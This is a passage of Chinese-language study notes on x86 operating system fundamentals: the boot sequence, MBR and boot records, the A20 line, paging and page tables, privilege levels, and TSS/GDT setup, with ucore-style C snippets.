<h2 id="BIOS中断，DOS中断，Linux中断"><a href="#BIOS中断，DOS中断，Linux中断" class="headerlink" title="BIOS中断，DOS中断，Linux中断"></a>BIOS中断，DOS中断，Linux中断</h2><p>BIOS DOS 都是存在于实模式下的程序，由它们建立的中断调用都是建立在中断向量表（Interrupt Vector Table，IVT）中的，它们都是通过软中断指令 int 中断号来调用的</p>
<p>中断向量表中的每个中断向量大小是4字节，这4字节描述了一个中断处理例程（程序）的段基址和 段内偏移地址，因为中断向量表的长度为 1024 字节，故该表最多容纳 256 个中断向量处理程序，计算机启动之初，中断向量表中的中断例程是由 BIOS 立的，它从物理内存地址 0x0000 处初始化并在中断向量表中添加各种处理例程</p>
<ul>
<li>BIOS中断<ul>
<li>BIOS中断调用的主要功能是提供了硬件访问的方法，该方法使对硬件的操作变得简单易行</li>
<li>BIOS也是一段程序，是程序就很可能要重复性地执行某段代码，它直接将其写成中断函数，直接调用多省心</li>
<li>BIOS中断还可以给后来的程序用，如加载器或 boot loader，它们在调用硬件资源时就不需要自己重写代码了</li>
</ul>
</li>
<li>DOS中断<ul>
<li>DOS是运行在实模式下的，故其建立的中断调用也建立在中断向量表中，只不过其中断向量号和 BIOS 的不能冲突</li>
<li>DOS中断只占用 0x21 这个中断号，也就是 DOS 只有这一个中断例程</li>
<li>DOS中断调用中那么多功能是如何实现的：通过先往 ah 寄存器中写好子功能号，再执行 int 0x21 这时在中断向量表中第 0x21 个表项（即物理地址 0x21*4 处中的中断处理程序），开始根据寄存器 ah 中的值来调用相应的子功能</li>
</ul>
</li>
<li>Linux中断<ul>
<li>Linux 内核是在进入保护模式后才建立中断例程的，不过在保护模式下，中断向量表己经不存在了，取而代之的是中断描述符表（Interrupt Descriptor Table，IDT）</li>
<li>Linux 的系统调用和 DOS 中断调用类似，不过 Linux 是通过 int 0x80 指令进入一个中断程序后再根据 eax 寄存器的值来调用不同的子功能函数的（ebx，ecx，edx作为参数）</li>
</ul>
</li>
</ul>
<h2 id="魔数"><a href="#魔数" class="headerlink" title="魔数"></a>魔数</h2><p>魔数，其实也称为神奇数字，它被用来为重要的数据定义标签，用独特的数字唯一地标识该数据</p>
<p>案例：</p>
<ul>
<li>主引导记录最后的两个字节的内容是 0x55, 0xaa，这表明这个扇区里面有可加载的程序， BIOS 就用它来校验该扇区是否可引导</li>
<li>各分区都有超级块，一般位于本分区的第2个扇区，超级块里面记录了此分区的信息，其中就有文件系统的魔数，一种文件系统对应一个魔数，比对此值便知道文件系统类型</li>
</ul>
<h2 id="MBR，EBR，DBR，OBR"><a href="#MBR，EBR，DBR，OBR" class="headerlink" title="MBR，EBR，DBR，OBR"></a>MBR，EBR，DBR，OBR</h2><p>计算机在接电之后运行的是基本输入输出系统 BIOS，而 BIOS 是位于主板上的一个小程序，其所在的空间有限，代码量较少，功能受限，因此它不可能一人扛下所有的任务需求，也就是肯定不能充 当操作系统的角色，必须采取控制权接力的方式，一步步地让处理器执行更为复杂强大的指令，最终把处理器的使用权交给操作系统，这才让计算机走上了正轨，从而可以完成各种复杂的功能</p>
<p>采用接力式控制权交接，BIOS 只完成一些简单的检测或初始化工作，然后找机会把处理器使用权交出去：下一个接力棒的选手是 MBR（为了方便 BIOS 找到 MBR，MBR 必须在固定的位置等待，因此位于整个硬盘最开始的扇区）</p>
<ul>
<li><p>MBR（Main Boot Record）</p>
<ul>
<li>MBR 是主引导记录，它存在于整个硬盘最开始的那个扇区，即 0盘 0道 1扇区，这个扇区便称为 MBR 引导扇区</li>
<li>MBR 引导扇区中的内容是：446字节的引导程序及参数（bootloader），64字节的分区表，2字节结束标记 0x55 0xaa</li>
</ul>
</li>
<li><p>OBR（OS Boot Record）</p>
<ul>
<li>为了 MBR 方便找到活动分区上的内核加载器，内核加载器的入口地址也必须在固定的位置，这个位置就是各分区最开始的扇区，这个“各分区起始的扇区”中存放的是操作系统引导程序 一一 内核加载器</li>
<li>因此该扇区称为操作系统引导扇区，其中的引导程序（内核加载器）称为操作系统引导记录 OBR（即 OS Boot Recod），此扇区也被称为 OBR 引导扇区</li>
</ul>
</li>
<li><p>DBR（DOS Boot Record）</p>
<ul>
<li>OBR 是从 DBR 遗留下来的， 要想了解 OBR，还是先从了解 DBR 开始，DBR（DOS Boot Record），也就是 DOS 操作系统的引导记录</li>
<li>DBR 中的内容大概是：<ul>
<li>跳转指令，使 MBR 跳转到引导代码</li>
<li>厂商信息、 DOS 版本信息</li>
<li>BIOS 参数块 BPB（即 BIOS Parameter Block）</li>
<li>操作系统引导程序</li>
<li>结束标记 0x55 和 0xaa</li>
</ul>
</li>
<li>在 DOS 时代只有4个分区，不存在扩展分区，这4个分区都相当于主分区，所以各主分区最开始的扇区称为 DBR 引导扇区，后来有了扩展分区之后，无论分区是主分区，还是逻辑分区，为了兼容，分区最开始的扇区都作为 DOS 引导扇区</li>
<li>后来 DOS 也退出历史舞台了，所以 DBR 也称为 OBR</li>
</ul>
</li>
<li><p>EBR（Expand Boot Record）</p>
<ul>
<li>当初为了解决分区数量限制的问题才有了扩展分区， EBR 是扩展分区中为了兼容 MBR 才提出的概念，主要是兼容 MBR 中的分区表</li>
<li>EBR 位于各子扩展分区中最开始的扇区（注意：各主分区和各逻辑分区中最开始的扇区是操作系统引导扇区），理论上 MBR 只有1个，但 EBR 有无数个</li>
</ul>
</li>
</ul>
<h2 id="接力式控制权交接"><a href="#接力式控制权交接" class="headerlink" title="接力式控制权交接"></a>接力式控制权交接</h2><p><strong>BIOS主导</strong></p>
<p>BIOS 是计算机上第一个运行的软件，但它不可能自己加载自己，由此可以知道，它是由硬件加载的 —— 只读存储器 ROM（只读存储器中的内容是不可擦除的）</p>
<p>BIOS 代码所做的工作也是一成不变的，而且在正常情况下，其本身是不需要修改的（平时听说的那些主板坏了要刷 BIOS 的情况属于例外），于是 BIOS 顺理成章地便被写进此 ROM</p>
<p>此 ROM 被映射在低端 lMB 内存的顶部，即地址 0xF0000 ~ 0xFFFFF 处，只要访问此处的地址便是访问了 BIOS（这个映射是由硬件完成的），在开机的瞬间，也就是接电的一瞬间，CPU CS: IP 寄存器被强制初始化为 0xF000: 0xFFF0 （指向有效地址 0xFFFF0），此地址便是 BIOS 的入口地址</p>
<p>因为 BIOS 是在实模式下运行的，而实模式只能访问 1MB 空间（20位地址线，2的20次方是1MB）而地址 0xFFF0 距离 1MB 只有16个字节了，肯定不能完成全部的工作，所以此处的代码只能是个跳转指令 <code>jmp far f000:e05b</code>（即跳向了 0xfe05b 处，这是 BIOS 代码真正开始的地方）</p>
<p>接下来 BIOS 便马不停蹄地检测内存、显卡等外设信息，当检测通过，并初始化好硬件后，开始在内存中 0x000 ~ 0x3FF 处建数据结构，中断向量表 IVT 并填写中断例程，BIOS 最后一项工作就是校验启动盘中位于“0盘0道1扇区”的内容</p>
<p><strong>MBR主导</strong></p>
<p>BIOS 将会加载存储设备上，第一个扇区（通常512字节）到内存（0x7c00），然后跳转到 0x7c00 的第一条地址开始执行，这512字节就是 MBR，其中包含了BootLoader（最后两字节固定）</p>
<p>通常，MBR 的任务是加载某个程序（这个程序一般是内核加载器，很少有直接加载内核的）到指定位置，并将控制权交给它（所谓的交控制权就是 jmp 去而己），之后 MBR 就没用了，被覆盖也没关系</p>
<p>MBR 的大小必须是 512 字节，这是为了保证 0x55 0xaa 这两个魔数恰好出现在该扇区的最后两个字节处（即第 510 字节处和第 511 字节处），由于我们的 bochs 模拟的是 x86 平台，所以是小端字节序，故其最后两个字节内容是 0xaa55 </p>
<h2 id="A20地址线"><a href="#A20地址线" class="headerlink" title="A20地址线"></a>A20地址线</h2><p>地址（Address ）线从0开始编号，在 8086/8088 中，只有20位地址线，即 A0 ~ A19</p>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649695447640.png" class width="1649695447640"> 
<p>对于 80286 后续的 CPU，虽然地址总线从原来的20位发展到了24位，但它们为了兼容20位的地址线，采用了 A20GATE 来控制 A20 地址线</p>
<ul>
<li>如果 A20Gate 被打开，当访问到 0x100000 ~ 0x10FFEF 之间的地址时， CPU 将真正访问这块物理内存（正常使用24位的地址线）</li>
<li>如果 A20Gate 被禁止，当访问 0x100000 ~ 0x10FFEF 之间的地址时， CPU 将采用 8086/8088 的地址回绕（为了兼容 8086/8088 的实模式）</li>
</ul>
<h2 id="获取物理内存容量"><a href="#获取物理内存容量" class="headerlink" title="获取物理内存容量"></a>获取物理内存容量</h2><p>Linux 有多种办法可以获取内存容量，如果一种方式失效，它就会尝试其他办法</p>
<p>在 Linux 2.6 内核中，是用 detect_memory 函数来获取内存容量的，其函数在本质上是通过调用 BIOS 中断 0x15 实现的，分别是 BIOS 中断 0x15 的3个子功能，子功能号要存放到寄存器 EAX AX 中，如下：</p>
<ul>
<li>EAX=0xE820：遍历主机上全部内存</li>
<li>AX=0xE801：分别检测低 15MB 和 16MB ~ 4GB 的内存，最大支持 4GB</li>
<li>AH=0x88：最多检测出 64MB 内存，如果实际内存超过此容量也按照 64MB 返回 </li>
</ul>
<h2 id="分页机制"><a href="#分页机制" class="headerlink" title="分页机制"></a>分页机制</h2><p>分页机制是基于分段机制诞生的，它的目的是为了解决分段机制的不足之处：</p>
<ul>
<li>在保护模式中段寄存器中的内容己经是段选择子，但段选择子最终就是为了要找到段基址，其内存访问的核心机制依然是“段基址：段内偏移地址”，这两个地址在相加之后才是绝对地址，也就是我们所说的线性地址</li>
<li>此线性地址在分段机制下被 CPU 认为是物理地址，直接拿来就能用，也就是说，此线性地址可以直接送上地址总线</li>
<li>这种线性地址与物理地址一一对应的关系不利于 CPU 对多任务的控制（因为 CPU 必须使用连续的内存块来加载程序，而一些细小的内存块则难以利用）</li>
</ul>
<p>分页机制的关键点就是：</p>
<ul>
<li>解除线性地址与物理地址一一对应的关系</li>
<li>然后将它们的关系通过某种映射关系重新建立，可以将线性地址映射到任意物理地址</li>
</ul>
<p>分页机制的作用有两方面：</p>
<ul>
<li>将线性地址转换成物理地址</li>
<li>用大小相等的页代替大小不等的段</li>
</ul>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649750602645.png" class width="1649750602645"> 
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649750359767.png" class width="1649750359767"> 
<ul>
<li>CPU 在不打开分页机制的情况下，是按照默认的分段方式进行的，段基址和段内偏移地址经过段部件处理后所输出的线性地址，CPU 就认为是物理地址</li>
<li>如果打开了分页机制，段部件输出的线性地址就不再等同于物理地址了，我们称之为虚拟地址，它是逻辑上的，是假的，不应该被送上地址总线</li>
<li>CPU 必须要拿到物理地址才行，此虚拟地址对应的物理地址需要在页表中查找，这项查找工作是由页部件自动完成的</li>
</ul>
<p>为了要搞清楚页部件的工作原理，必须要搞清楚这两件事：</p>
<ul>
<li>分页机制的原理</li>
<li>页表的结构</li>
</ul>
<p><strong>一级页表</strong></p>
<p>页是地址空间的计量单位，并不是专属物理地址或线性地址，只要是 4KB 的地址空间都可以称为一 页，所以线性地址的一页也要对应物理地址的一页</p>
<p>一页大小为 4KB ，这样一来，4GB 地址空间被划分 4GB/4KB=1M 个页，也就是 4GB 空间中可以容纳 1048576 个页，页表中自然也要有 1048576 个页表项，这就是我们要说的一级页表</p>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649751824877.png" class width="1649751824877"> 
<ul>
<li>其实一级页表就是把 4GB 的物理内存拆分为 1M 个 4KB 的内存页</li>
<li>然后操作系统会根据页表的顺序重新编排一个虚拟地址提供给每个进程，使其可以索引到分配给自己的物理内存<ul>
<li>对于各个进程来说：<ul>
<li>进程看到的，使用的，就是一段连续的 4GB 虚拟地址</li>
<li>好像每个进程都在单独使用计算机的内存空间一样</li>
</ul>
</li>
<li>对于操作系统来说：<ul>
<li>操作系统看到的，是各个进程都在使用物理内存上不连续的内存块</li>
<li>而操作系统的任务就是，把这些不连续的物理内存块整合成页表，提供给各个进程</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>当计算机采用一级页表进行内存管理时：</p>
<ul>
<li>系统分配出连续的 1K 个内存页，用于充当页表</li>
<li>有一个专门的寄存器来存放页表的地址（CPU不同，寄存器不同）</li>
</ul>
<p>一级页表的转换过程：</p>
<ul>
<li>根据线性地址，获取页表项索引和物理页内偏移</li>
<li>根据固定寄存器获取页表的物理地址，然后通过索引获取对应的页表项</li>
<li>页表项里面装有对应的物理页地址</li>
<li>最后通过物理页内偏移计算出具体的物理地址</li>
</ul>
<p><strong>一级页表的局限</strong></p>
<ul>
<li>一级页表中的所有表项必须要提前建好，原因是操作系统要占用 4GB 虚拟地址空间的高 1GB ，用户进程占用低 3GB，每个进程都有自己的页表，进程越多，页表占用空间越大</li>
<li>根据局部性原理可知，很多时候，进程在一段时间内只需要访问某几个页面就可以正常运行了，因此也没有必要让整个页面都常驻内存</li>
<li>有时候，我们希望页表在我们需要的时候动态增加，不需要一次性建立好</li>
</ul>
<p>对应的解决方案就是二级页表</p>
<p><strong>二级页表</strong></p>
<p>无论是几级页表，标准页的尺寸都是 4KB，所以 4GB 线性地址空间最多有 1M 个标准页</p>
<ul>
<li>一级页表是将这 1M 个标准页放置到一张页表中：<ul>
<li>导致这一张页表很大，还必选占用连续的内存空间（连续 1K 个标准页）</li>
<li>并且每个进程都需要一张这个页表</li>
</ul>
</li>
<li>二级页表是将这 1M 个标准页平均放置 1K 个页表中：<ul>
<li>每个页表的大小减少了，并且不需要占用连续的内存空间</li>
<li>需要建立一张页表，用来统一管理这些不连续的页表（称为页目录表，或外层页表，或顶层页表）</li>
</ul>
</li>
</ul>
<p>具体的“平均放置”过程：</p>
<ul>
<li>将长长的页表进行分组，使每个页面中刚好可以放下一个分组：每个页表项4B，所以每个页面中可以存放1K（1024）个页表项，因此每1K个连续的页表项为一组，每组刚好占一个页面</li>
</ul>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649850553506.png" class width="1649850553506">  
<p>以32位逻辑地址空间的分页系统为例：</p>
<ul>
<li>如果采用一级页表，那么页表所占用的内存空间是1MB，而且必须是连续的</li>
<li>现在我们将页表等分成1024份，即产生了1024个页面，并且每个页面有1024个表项（每个表项1B，即每个页面1KB），存储的是页号与物理块号的映射关系</li>
<li>然后我们建立外层页表，由于有1024个页面，所以外层页表有1024个表项（每个表项1B，外层页表1KB），存储的是各个页面的首地址</li>
<li>这样我们就实现了一个两级页表，由于两级页表采用了离散分配的方式，外层页表和每个表项所对应的页面分别存储在不同的物理块中，解决了需要连续存储的问题</li>
</ul>
<p>当计算机采用二级页表进行内存管理时：</p>
<ul>
<li>页目录表（Page Directory Table，PDT）装有最多 1KB 个页目录表项（页目录表条目）<ul>
<li>页目录表：一级页表</li>
<li>页目录表项：二级页表</li>
<li>相当于在一级页表中装有二级页表</li>
</ul>
</li>
<li>每个页目录表项（Page Table Entry，PTE）都装有最多 1KB 个表项<ul>
<li>每个表项都指向一个物理页（和一级页表的情况相同）</li>
<li>此时二级页表就担当起原来一级页表的工作</li>
</ul>
</li>
</ul>
<p>二级页表的转换过程：</p>
<ul>
<li>根据线性地址，获取页目录表项索引，页表项索引和物理页内偏移</li>
<li>根据固定寄存器获取页目录表的物理地址，然后通过页目录表项索引获取对应的页目录表项</li>
<li>页目录表项存放着二级页表的物理地址</li>
<li>通过页表项索引获取对应的二级页表项</li>
<li>二级页表项中存放着对应的物理页地址</li>
<li>最后通过物理页内偏移计算出具体的物理地址</li>
</ul>
<h2 id="页表结构"><a href="#页表结构" class="headerlink" title="页表结构"></a>页表结构</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* page table/directory entry flags */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_P           0x001                   <span class="comment">// Present</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_W           0x002                   <span class="comment">// Writeable</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_U           0x004                   <span class="comment">// User</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_PWT         0x008                   <span class="comment">// Write-Through</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_PCD         0x010                   <span class="comment">// Cache-Disable</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_A           0x020                   <span class="comment">// Accessed</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_D           0x040                   <span class="comment">// Dirty</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_PS          0x080                   <span class="comment">// Page Size</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_MBZ         0x180                   <span class="comment">// Bits must be zero</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_AVAIL       0xE00                   <span class="comment">// Available for software use</span></span></span><br><span class="line">                                                </span><br><span class="line"><span class="comment">// The PTE_AVAIL bits aren&#x27;t used by the kernel or interpreted by the hardware, so user processes are allowed to set them arbitrarily.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_USER        (PTE_U | PTE_W | PTE_P) <span class="comment">// Offset</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>0 - <strong>P</strong>resent：表示当前PTE所指向的物理页面是否驻留在内存中</li>
<li>1 - <strong>W</strong>riteable：表示是否允许读写</li>
<li>2 - <strong>U</strong>ser：表示该页的访问所需要的特权级（即User(ring 3)是否允许访问）</li>
<li>3 - <strong>P</strong>ageWriteThough：表示是否使用write through缓存写策略</li>
<li>4 - <strong>P</strong>ageCacheDisable：表示是否 <strong>不对</strong> 该页进行缓存</li>
<li>5 - <strong>A</strong>ccess：表示该页是否已被访问过</li>
<li>6 - <strong>D</strong>irty：表示该页是否已被修改</li>
<li>7 - <strong>P</strong>ageSize：表示该页的大小</li>
<li>8 - <strong>M</strong>ustBeZero：该位必须保留为0</li>
<li>9-11 - <strong>A</strong>vailable：第9-11这三位并没有被内核或中断所使用，可保留给OS使用</li>
<li>12-31 - <strong>O</strong>ffset：目标地址的后20位</li>
</ul>
<h2 id="线性地址结构"><a href="#线性地址结构" class="headerlink" title="线性地址结构"></a>线性地址结构</h2><img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649860246487.png" class width="1649860246487"> 
<p>线性地址（linear address）也称虚拟地址virtual address：是一个32位无符号整数，用来表示高达4GB的地址</p>
<p>一级页表：</p>
<ul>
<li>线性地址的高20位在页表中索引页表项</li>
<li>线性地址的低12位与页表项中的物理地址相加，所求的和便是最终线性地址对应的物理地址</li>
</ul>
<p>二级页表：</p>
<ul>
<li>线性地址的高10位（第31~22位）用来在页目录中定位一个页表<ul>
<li>也就是这高10位用于定位页目录中的<strong>页目录项 PDE</strong></li>
<li>PDE 中有页表物理页地址</li>
</ul>
</li>
<li>线性地址的中间10位（第 21~12位）用来在页表中定位具体的物理页 <ul>
<li>也就是在页表中定位一个<strong>页表项 PTE</strong></li>
<li>PTE 中有分配的物理页地址</li>
</ul>
</li>
<li>余下的12位（第11~0位）用于页内偏移量</li>
</ul>
<p>注意：</p>
<ul>
<li>页目录表（一级页表）内存放二级页表的 <strong>物理地址</strong> ，但却使用 <strong>线性地址</strong> 索引页目录表中的条目</li>
<li>构成线性地址的各个部分都是 <strong>偏移或索引</strong></li>
</ul>
<h2 id="特权级别简述"><a href="#特权级别简述" class="headerlink" title="特权级别简述"></a>特权级别简述</h2><p>特权级别（Privilege Level）是存在于 Descriptor（描述符）及 Segment Selector（段选择子，存储在段寄存器以及门描述符中） 中一个数值，当这些 Descriptor 或 Segment Selector 要进行某些操作，或者被别的对象访问时，该数值用于控制它们能够进行的操作或者限制它们的可访问性</p>
<p>特权级共分为四档，分别为0-3：</p>
<ul>
<li>Kernel为第0特权级（ring 0）</li>
<li>用户程序为第3特权级（ring 3）</li>
<li>操作系统保护分别为第1和第2特权级</li>
</ul>
<p><strong>描述符特权级（DPL，Descriptor Privilege Level）</strong></p>
<ul>
<li>实施特权级保护的第一步，是为所有可管理的对象赋予一个特权级，以决定谁能访问它们，每个 Descriptor 都具有描述符特权级（DPL，Descriptor Privilege Level）字段，Descriptor 总是指向它所“描述”的目标对象，代表着该对象，因此该字段（DPL）实际上是目标对象的特权级</li>
<li>存储于段描述符中：</li>
</ul>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649146076621.png" class width="1649146076621"> 
<p><strong>当前特权级（CPL，Current Privilege Level）</strong></p>
<ul>
<li>当处理器正在一个代码段中取指令和执行指令时，那个代码段的特权级叫做当前特权级（CPL，Current Privilege Level），正在执行的这个代码段，其选择子位于段寄存器CS中，其最低两位就是当前特权级的数值</li>
<li>存储于CS寄存器的段选择子中（CS中的DPL就是CPL）：</li>
</ul>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649146195666.png" class width="1649146195666"> 
<p><strong>请求特权级（RPL，Request Privilege Level）</strong></p>
<ul>
<li>我们知道，要将控制从一个代码段转移到另一个代码段，通常是使用 <code>jmp</code> 和 <code>call</code> 指令，并在指令中提供目标代码段的选择子，以及段内偏移量(入口点)，而为了访问内存中的数据，也必须先将段选择子加载到段寄存器DS、ES、FS或者GS中，不管是实施控制转移，还是访问数据段，这都可以看成是一个请求，请求者提供一个段选择子，请求访问指定的段，从这个意义上来说，RPL也就是指请求者的特权级别（RPL，Request Privilege Level）</li>
<li>存储于段选择子中：（段选择子存储于各个段寄存器以及门描述符中：调用门、任务门、中断门、陷阱门）</li>
</ul>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649146143417.png" class width="1649146143417"> 
<p><strong>输出特权级（IOPL，I/O Privilege Level）</strong></p>
<ul>
<li>除了那些特权级敏感的指令外，处理器还允许对各个特权级别所能执行的I/O操作进行控制，通常，这指的是端口访问的许可权，因为对设备的访问都是通过端口进行的</li>
<li>在处理器的标志寄存器EFLAGS中，位13、位12是IOPL位，也就是输入/输出特权级（IOPL，I/O Privilege Level），它代表着当前任务的I/O特权级别，某些指令，例如 IN，OUT，CLI 需要 I/O 特权，这些操作根据 IOPL 和 CPL 确定合法性</li>
<li>存储于EFLAGS中： </li>
</ul>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649146429816.png" class width="1649146429816">  
<h2 id="特权级别运用"><a href="#特权级别运用" class="headerlink" title="特权级别运用"></a>特权级别运用</h2><p><strong>特权级检查</strong></p>
<p>在下述的特权级比较中，需要注意特权级越低，其ring值越大：</p>
<ul>
<li>访问门时（中断、陷入、异常），要求 <strong>DPL[段] &lt;= CPL &lt;= DPL[门]</strong> （ring值比较）<ul>
<li>访问门的代码权限比门的特权级要高，因为这样才能访问门（CPL &lt;= DPL[门]）</li>
<li>但访问门的代码权限比被访问的段的权限要低，因为通过门的目的是访问特权级更高的段，这样就可以达到低权限应用程序使用高权限内核服务的目的（CPL &lt;= DPL[门]）</li>
<li>简述：代码权限低于段权限时，可以通过访问门的方式来访问段</li>
</ul>
</li>
<li>访问段时，要求 <strong>DPL[段] &gt;= max {CPL, RPL}</strong> （ring值比较）<ul>
<li>只能使用最低的权限来访问段数据</li>
<li>简述：请求权限与当前权限只要有一个低于段权限，就会导致访问失败</li>
</ul>
</li>
</ul>
<p><strong>特权级切换</strong></p>
<p><strong>TSS</strong></p>
<p>TSS（Task State Segment）是操作系统在进行进程切换时保存进程现场信息的段，其结构如下：</p>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649147399799.png" class width="1649147399799"> 
<ul>
<li>TSS中分别保留了 ring0、ring1、ring2 的栈，当用户程序从 ring3 跳至 ring0 时（例如执行中断），此时的栈就会从用户栈切换到内核栈，切换栈的操作从开始中断的那一瞬间就已完成（例如：从<code>int 0x78</code>到中断处理例程之间）</li>
<li>TSS段的段描述符保存在GDT中，其 ring0 的栈会在初始化GDT时被一起设置，<code>TR</code> 寄存器会保存当前TSS的段描述符，以提高索引速度</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">segdesc</span> <span class="title">gdt</span>[] =</span> &#123;</span><br><span class="line">    SEG_NULL,</span><br><span class="line">    [SEG_KTEXT] = SEG(STA_X | STA_R, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_KERNEL),</span><br><span class="line">    [SEG_KDATA] = SEG(STA_W, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_KERNEL),</span><br><span class="line">    [SEG_UTEXT] = SEG(STA_X | STA_R, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_USER),</span><br><span class="line">    [SEG_UDATA] = SEG(STA_W, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_USER),</span><br><span class="line">    [SEG_TSS]   = SEG_NULL,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">pseudodesc</span> <span class="title">gdt_pd</span> =</span> &#123;</span><br><span class="line">      <span class="keyword">sizeof</span>(gdt) - <span class="number">1</span>, (<span class="keyword">uintptr_t</span>)gdt</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* gdt_init - initialize the default GDT and TSS */</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function">  <span class="title">gdt_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 设置TSS的ring0栈地址，包括esp寄存器和SS段寄存器</span></span><br><span class="line">      load_esp0((<span class="keyword">uintptr_t</span>)bootstacktop);</span><br><span class="line">      ts.ts_ss0 = KERNEL_DS;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 将TSS写入GDT中</span></span><br><span class="line">      gdt[SEG_TSS] = SEGTSS(STS_T32A, (<span class="keyword">uintptr_t</span>)&amp;ts, <span class="keyword">sizeof</span>(ts), DPL_KERNEL);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 加载GDT至GDTR寄存器</span></span><br><span class="line">      lgdt(&amp;gdt_pd);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 加载TSS至TR寄存器</span></span><br><span class="line">      ltr(GD_TSS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>trapFrame</strong></p>
<p>trapframe 结构是进入中断门所必须的结构，中断处理例程的入口代码用于保存上下文并构建一个 trapframe</p>
<p>trapframe 的结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> &#123;</span></span><br><span class="line">    <span class="comment">// tf_regs保存了基本寄存器的值，包括eax,ebx,esi,edi寄存器等等</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pushregs</span> <span class="title">tf_regs</span>;</span></span><br><span class="line">    <span class="keyword">uint16_t</span> tf_gs;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding0;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_fs;</span><br><span class="line">    <span 